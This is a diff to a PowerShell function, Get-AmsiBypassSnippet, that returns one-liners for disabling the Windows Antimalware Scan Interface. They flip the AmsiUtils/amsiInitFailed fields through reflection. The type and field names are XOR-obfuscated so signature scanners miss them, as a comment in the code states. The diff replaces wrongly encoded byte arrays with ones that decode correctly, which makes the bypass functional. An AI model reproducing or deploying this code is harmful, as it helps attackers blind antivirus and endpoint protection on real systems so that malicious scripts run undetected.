@@ -23,7 +23,7 @@ function Get-AmsiBypassSnippet {
     switch ($Technique) {
         'fail' {
             # XOR key=13 decodes type/field names at runtime — no static sig for AmsiUtils/amsiInitFailed.
-            return "try{`$_k=13;`$_at=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,110,105,104,100,35,68,92,99,92,98,104,100,104,99,105,35,76,120,105,98,100,92,105,100,98,99,35,76,100,110,100,88,105,100,101,110)|%{`$_-bxor`$_k})));`$_at.GetFields([Reflection.BindingFlags]'NonPublic,Static')|%{if(`$_.FieldType-eq[bool]){`$_.SetValue(`$null,`$true)}elseif(`$_.FieldType-eq[IntPtr]){`$_.SetValue(`$null,[IntPtr]::Zero)}}}catch{}"
+            return "try{`$_k=13;`$_at=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_at.GetFields([Reflection.BindingFlags]'NonPublic,Static')|%{if(`$_.FieldType-eq[bool]){`$_.SetValue(`$null,`$true)}elseif(`$_.FieldType-eq[IntPtr]){`$_.SetValue(`$null,[IntPtr]::Zero)}}}catch{}"
         }
 
         'direct' {
@@ -54,8 +54,8 @@ function Get-AmsiBypassSnippet {
             return (
                 "try{" +
                 "`$_k=13;" +
-                "`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,110,105,104,100,35,68,92,99,92,98,104,100,104,99,105,35,76,120,105,98,100,92,105,100,98,99,35,76,100,110,100,88,105,100,101,110)|%{`$_-bxor`$_k})));" +
-                "`$_u.GetField([string]::new([char[]]([byte[]](92,100,110,100,68,99,100,105,67,92,100,101,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)" +
+                "`$_u=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));" +
+                "`$_u.GetField([string]::new([char[]]([byte[]](108,96,126,100,68,99,100,121,75,108,100,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$true)" +
                 "}catch{}"
             )
         }
